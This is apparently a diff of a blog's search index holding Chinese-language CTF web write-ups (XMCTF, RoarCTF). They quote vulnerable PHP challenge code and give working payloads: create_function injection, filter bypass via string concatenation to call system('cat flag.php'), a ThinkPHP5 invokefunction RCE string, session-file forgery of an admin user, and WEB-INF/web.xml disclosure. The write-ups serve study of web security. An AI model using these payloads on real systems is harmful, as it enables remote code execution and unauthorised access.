@@ -1,6 +1,56 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>XMCTF</title>
+    <url>/2020/04/29/XMCTF/</url>
+    <content><![CDATA[<h3 id="0x01-EASY-WEB1"><a href="#0x01-EASY-WEB1" class="headerlink" title="0x01:EASY_WEB1"></a>0x01:EASY_WEB1</h3><a id="more"></a>
+
+<p>直接给了源码，审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">"bad"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">'bad'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'badbad!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">'act'</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">'arg'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'check'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'666'</span>;</span><br><span class="line">badbad!!!</span><br></pre></td></tr></table></figure>
+
+<p>变量覆盖,extract($_POST)打开了全局变量POST，可以用post的值来覆盖key绕过第一个条件，后面的正则匹配通过查资料发现是一个创建函数</p>
+<p>payload:?act=\create_function&amp;arg=){}var_dump(scandir(‘../‘));//</p>
+<p>相当于是function xxx(arg){}=function(){var_dump(scandir(‘../‘));}//){},后面的两个斜杠注释了后面的内容，这样函数就完整了</p>
+<img src="/2020/04/29/XMCTF/1.png" class="" title="examplename">
+
+<p>可以看到有”ffflll4g”文件，读取文件就可以了</p>
+<h4 id="0X02：WEB7"><a href="#0X02：WEB7" class="headerlink" title="0X02：WEB7"></a>0X02：WEB7</h4><p>打开地址，源码给了，审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//大小写字母和数字都被过滤了，考虑用编码进行绕过，之前碰到过用取反再url编码可以绕过</span></span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//通过传一个中间变量$_,在通过$_()调用getFlag()方法读取，这里相当于是code=$_=getFlag;getFlag();</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：?code=$<em>=~%98%9A%8B%B9%93%9E%98;$</em>();相当于是code=$_=getFlag;getFlag();</p>
+<h4 id="0X03-WEB4"><a href="#0X03-WEB4" class="headerlink" title="0X03:WEB4"></a>0X03:WEB4</h4><p>打开题目给了一串key：e086aa137fa19f67d27b39d0eca18610，MD5解密一下，是一串ip地址，1.1.1.1,用burp抓包伪造ip</p>
+<img src="/2020/04/29/XMCTF/2.png" class="" title="examplename">
+
+<p>访问dhudndrgrhs.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">"assert"</span>,<span class="string">"print_r"</span>,<span class="string">"system"</span>, <span class="string">"shell_exec"</span>,<span class="string">"ini_set"</span>, <span class="string">"scandir"</span>, <span class="string">"exec"</span>,<span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'xmctf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]); </span><br><span class="line"><span class="comment">//几乎所有的远程命令执行漏洞都被ban了，这里可以利用php的字符串拼接，拼接命令来绕过正则</span></span><br><span class="line">payload=$a=<span class="string">'sys'</span>.<span class="string">'tem'</span>;$a(<span class="string">'cat flag.php'</span>);</span><br><span class="line">可以看到flag.php文件，读取，在网页源码处发现flag</span><br></pre></td></tr></table></figure>
+
+<h4 id="0X04-WEB10"><a href="#0X04-WEB10" class="headerlink" title="0X04:WEB10"></a>0X04:WEB10</h4><img src="/2020/04/29/XMCTF/3.png" class="" title="examplename">
+
+<p>可以看到提示是thinkphp5版本，直接上payload</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">index.php？s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/29/XMCTF/4.png" class="" title="examplename">
+
+<p>成功回显phpinfo页面，下面就可以爆目录文件了</p>
+<img src="/2020/04/29/XMCTF/5.png" class="" title="examplename">
+
+<p>在根目录下找到了flag文件，直接读取 system(“cat /flag”)即可</p>
+<h4 id="0X05-webEASYSESSION"><a href="#0X05-webEASYSESSION" class="headerlink" title="0X05:webEASYSESSION"></a>0X05:webEASYSESSION</h4><p>给了源码，审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = @$_GET[<span class="string">'content'</span>] ? <span class="string">"---mylocalnote---\n"</span> . $_GET[<span class="string">'content'</span>] : <span class="string">""</span>;</span><br><span class="line">$name = @$_GET[<span class="string">'name'</span>] ? $_GET[<span class="string">'name'</span>] : <span class="string">''</span>;</span><br><span class="line">str_replace(<span class="string">'/'</span>, <span class="string">''</span>, $name);</span><br><span class="line">str_replace(<span class="string">'\\'</span>, <span class="string">''</span>, $name);</span><br><span class="line">file_put_contents(<span class="string">"/tmp/"</span> . $name, $content);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Thank u,&#123;$_SESSION['username']&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>下面是有关session的知识点找到东西</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session反序列化</span><br><span class="line">PHP使用文件存储Session信息。因此如果我们把Session文件替换了，写入admin信息，那么Flag就会出来了。PHP的Session文件以”sess_”开头，后接Session ID，Session ID仅有[A-Za-z0-9-0]构成。Ubuntu默认安装的PHP中session.serialize_handler默认设置为php。这种情况下，Session文件的内容为(属性名)|(序列化数据)。在访问Session数据的时候，PHP会自动反序列化相应数据。那么，我们构造Note的标题名为”|N;admin|b:1;”。这样反序列化的结果就是admin&#x3D;&#x3D;bool(true)。我们就伪造了admin身份。而我们访问的时候，通过传递Cookie的值PHPSESSID为我们想要的Session ID，PHP就会去反序列化相应的Session文件。</span><br></pre></td></tr></table></figure>
+
+<p>payload:?content=|N;username|s:5:%22admin%22;&amp;name=sess_p4c8k2sf8gkv0bb9j8uu6r7d99</p>
+<p>成功写入名为username=admin的sessionID<br>再访问flag.php，传上cookie即可</p>
+<h4 id="0X06禁止套娃"><a href="#0X06禁止套娃" class="headerlink" title="0X06禁止套娃"></a>0X06禁止套娃</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag在哪里呢？</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//无参RCE</span></span><br><span class="line"><span class="comment">//localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span></span><br><span class="line"><span class="comment">//scandir() 列出 images 目录中的文件和目录。</span></span><br><span class="line"><span class="comment">//readfile() 输出一个文件。</span></span><br><span class="line"><span class="comment">//current() 返回数组中的当前单元, 默认取第一个值。</span></span><br><span class="line"><span class="comment">//pos() current() 的别名。</span></span><br><span class="line"><span class="comment">//next() 函数将内部指针指向数组中的下一个元素，并输出。</span></span><br><span class="line"><span class="comment">//array_reverse()以相反的元素顺序返回数组。</span></span><br><span class="line"><span class="comment">//highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>xm</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BJD2MRCTF</title>
     <url>/2020/03/29/BJD2MRCTF/</url>
     <content><![CDATA[<h2 id="MR"><a href="#MR" class="headerlink" title="MR"></a>MR</h2><a id="more"></a>
@@ -253,99 +303,6 @@
       </tags>
   </entry>
   <entry>
-    <title>RoarCTF</title>
-    <url>/2020/02/19/RoarCTF/</url>
-    <content><![CDATA[<h4 id="1-Easy-Java"><a href="#1-Easy-Java" class="headerlink" title="1.Easy Java"></a>1.Easy Java<a id="more"></a></h4><p>打开题目出现的是一个登录界面</p>
-<img src="/2020/02/19/RoarCTF/java.png" class="" title="examplename">
-
-<p>点击help出现了提示:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>
-
-<p>用burp抓包,但是怎么改都无法下载或者打开help.docx，后面尝试把GET改成了POST，成功打开了这个文件</p>
-<p>由于题目是跟java有关系，就去百度了，找到了一篇很详细的文章，这里是重点</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WEB-INF&#x2F;web.xml泄露</span><br><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 </span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure>
-
-<p>尝试WEB-INF/web.xml找到了疑似flag文件的东西…</p>
-<img src="/2020/02/19/RoarCTF/java1.png" class="" title="examplename">
-
-<p>可以看到有一个com.wm.ctf.FlagController</p>
-<p>构造payload:<code>WEB-INF/classes/com/wm.ctf.FlagController.class</code></p>
-<img src="/2020/02/19/RoarCTF/java2.png" class="" title="examplename">
-
-<p>可以看到一串base64编码的字符,解码即可得到flag.</p>
-<h4 id="2-Easy-Calc"><a href="#2-Easy-Calc" class="headerlink" title="2.Easy Calc"></a>2.Easy Calc</h4><p>是一道计算器的题，直接看网页源码找到了一个叫calc.php的文件，可以访问</p>
-<img src="/2020/02/19/RoarCTF/calc.png" class="" title="examplename">
-
-<p>可以看出payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 等字符,而且前面有提示说加上了WAF,这道题我们可以用%20来进行绕过WAF</p>
-
-
-<p>接下来的内容是刚刚从一篇博客学到的新知识，在这之前并不知道(我太菜了…)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php的文件操作函数：</span><br><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">dirname(string $path) — 返回 path 的父目录</span><br><span class="line">scandir — 列出指定路径中的文件和目录</span><br></pre></td></tr></table></figure>
-
-<p>有了上面的这些操作函数,那么就看可以找flag了…</p>
-<p>一层层往上找</p>
-<img src="/2020/02/19/RoarCTF/java3.png" class="" title="examplename">
-
-<p>在这里找到了f1agg的文件,但是/是被过滤的,这里不能直接用<code>var_dump(file_get_contents(&#39;/f1agg&#39;));</code></p>
-<p>想到了用ascii码来进行绕过,用’.’来进行拼接</p>
-<p>payload：<code>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))；</code></p>
-<p>顺利拿到flag</p>
-]]></content>
-      <tags>
-        <tag>something import</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XMCTF</title>
-    <url>/2020/04/29/XMCTF/</url>
-    <content><![CDATA[<h3 id="0x01-EASY-WEB1"><a href="#0x01-EASY-WEB1" class="headerlink" title="0x01:EASY_WEB1"></a>0x01:EASY_WEB1</h3><a id="more"></a>
-
-<p>直接给了源码，审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">"bad"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">'bad'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'badbad!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">'act'</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">'arg'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'check'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'666'</span>;</span><br><span class="line">badbad!!!</span><br></pre></td></tr></table></figure>
-
-<p>变量覆盖,extract($_POST)打开了全局变量POST，可以用post的值来覆盖key绕过第一个条件，后面的正则匹配通过查资料发现是一个创建函数</p>
-<p>payload:?act=\create_function&amp;arg=){}var_dump(scandir(‘../‘));//</p>
-<p>相当于是function xxx(arg){}=function(){var_dump(scandir(‘../‘));}//){},后面的两个斜杠注释了后面的内容，这样函数就完整了</p>
-<img src="/2020/04/29/XMCTF/1.png" class="" title="examplename">
-
-<p>可以看到有”ffflll4g”文件，读取文件就可以了</p>
-<h4 id="0X02：WEB7"><a href="#0X02：WEB7" class="headerlink" title="0X02：WEB7"></a>0X02：WEB7</h4><p>打开地址，源码给了，审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//大小写字母和数字都被过滤了，考虑用编码进行绕过，之前碰到过用取反再url编码可以绕过</span></span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//通过传一个中间变量$_,在通过$_()调用getFlag()方法读取，这里相当于是code=$_=getFlag;getFlag();</span></span><br></pre></td></tr></table></figure>
-
-<p>payload：?code=$<em>=~%98%9A%8B%B9%93%9E%98;$</em>();相当于是code=$_=getFlag;getFlag();</p>
-<h4 id="0X03-WEB4"><a href="#0X03-WEB4" class="headerlink" title="0X03:WEB4"></a>0X03:WEB4</h4><p>打开题目给了一串key：e086aa137fa19f67d27b39d0eca18610，MD5解密一下，是一串ip地址，1.1.1.1,用burp抓包伪造ip</p>
-<img src="/2020/04/29/XMCTF/2.png" class="" title="examplename">
-
-<p>访问dhudndrgrhs.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">"assert"</span>,<span class="string">"print_r"</span>,<span class="string">"system"</span>, <span class="string">"shell_exec"</span>,<span class="string">"ini_set"</span>, <span class="string">"scandir"</span>, <span class="string">"exec"</span>,<span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'xmctf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]); </span><br><span class="line"><span class="comment">//几乎所有的远程命令执行漏洞都被ban了，这里可以利用php的字符串拼接，拼接命令来绕过正则</span></span><br><span class="line">payload=$a=<span class="string">'sys'</span>.<span class="string">'tem'</span>;$a(<span class="string">'cat flag.php'</span>);</span><br><span class="line">可以看到flag.php文件，读取，在网页源码处发现flag</span><br></pre></td></tr></table></figure>
-
-<h4 id="0X04-WEB10"><a href="#0X04-WEB10" class="headerlink" title="0X04:WEB10"></a>0X04:WEB10</h4><img src="/2020/04/29/XMCTF/3.png" class="" title="examplename">
-
-<p>可以看到提示是thinkphp5版本，直接上payload</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">index.php？s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo();</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/04/29/XMCTF/4.png" class="" title="examplename">
-
-<p>成功回显phpinfo页面，下面就可以爆目录文件了</p>
-<img src="/2020/04/29/XMCTF/5.png" class="" title="examplename">
-
-<p>在根目录下找到了flag文件，直接读取 system(“cat /flag”)即可</p>
-<h4 id="0X05-webEASYSESSION"><a href="#0X05-webEASYSESSION" class="headerlink" title="0X05:webEASYSESSION"></a>0X05:webEASYSESSION</h4><p>给了源码，审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = @$_GET[<span class="string">'content'</span>] ? <span class="string">"---mylocalnote---\n"</span> . $_GET[<span class="string">'content'</span>] : <span class="string">""</span>;</span><br><span class="line">$name = @$_GET[<span class="string">'name'</span>] ? $_GET[<span class="string">'name'</span>] : <span class="string">''</span>;</span><br><span class="line">str_replace(<span class="string">'/'</span>, <span class="string">''</span>, $name);</span><br><span class="line">str_replace(<span class="string">'\\'</span>, <span class="string">''</span>, $name);</span><br><span class="line">file_put_contents(<span class="string">"/tmp/"</span> . $name, $content);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Thank u,&#123;$_SESSION['username']&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br></pre></td></tr></table></figure>
-
-<p>下面是有关session的知识点找到东西</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session反序列化</span><br><span class="line">PHP使用文件存储Session信息。因此如果我们把Session文件替换了，写入admin信息，那么Flag就会出来了。PHP的Session文件以”sess_”开头，后接Session ID，Session ID仅有[A-Za-z0-9-0]构成。Ubuntu默认安装的PHP中session.serialize_handler默认设置为php。这种情况下，Session文件的内容为(属性名)|(序列化数据)。在访问Session数据的时候，PHP会自动反序列化相应数据。那么，我们构造Note的标题名为”|N;admin|b:1;”。这样反序列化的结果就是admin&#x3D;&#x3D;bool(true)。我们就伪造了admin身份。而我们访问的时候，通过传递Cookie的值PHPSESSID为我们想要的Session ID，PHP就会去反序列化相应的Session文件。</span><br></pre></td></tr></table></figure>
-
-<p>payload:?content=|N;username|s:5:%22admin%22;&amp;name=sess_p4c8k2sf8gkv0bb9j8uu6r7d99</p>
-<p>成功写入名为username=admin的sessionID<br>再访问flag.php，传上cookie即可</p>
-<h4 id="0X06禁止套娃"><a href="#0X06禁止套娃" class="headerlink" title="0X06禁止套娃"></a>0X06禁止套娃</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag在哪里呢？</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//无参RCE</span></span><br><span class="line"><span class="comment">//localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span></span><br><span class="line"><span class="comment">//scandir() 列出 images 目录中的文件和目录。</span></span><br><span class="line"><span class="comment">//readfile() 输出一个文件。</span></span><br><span class="line"><span class="comment">//current() 返回数组中的当前单元, 默认取第一个值。</span></span><br><span class="line"><span class="comment">//pos() current() 的别名。</span></span><br><span class="line"><span class="comment">//next() 函数将内部指针指向数组中的下一个元素，并输出。</span></span><br><span class="line"><span class="comment">//array_reverse()以相反的元素顺序返回数组。</span></span><br><span class="line"><span class="comment">//highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>xm</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Xss</title>
     <url>/2020/01/14/Xss/</url>
     <content><![CDATA[<h4 id="1-Xss漏洞简介"><a href="#1-Xss漏洞简介" class="headerlink" title="1.Xss漏洞简介"></a>1.Xss漏洞简介</h4><a id="more"></a>
@@ -395,6 +352,49 @@
 ]]></content>
       <tags>
         <tag>Xss总结</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RoarCTF</title>
+    <url>/2020/02/19/RoarCTF/</url>
+    <content><![CDATA[<h4 id="1-Easy-Java"><a href="#1-Easy-Java" class="headerlink" title="1.Easy Java"></a>1.Easy Java<a id="more"></a></h4><p>打开题目出现的是一个登录界面</p>
+<img src="/2020/02/19/RoarCTF/java.png" class="" title="examplename">
+
+<p>点击help出现了提示:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用burp抓包,但是怎么改都无法下载或者打开help.docx，后面尝试把GET改成了POST，成功打开了这个文件</p>
+<p>由于题目是跟java有关系，就去百度了，找到了一篇很详细的文章，这里是重点</p>
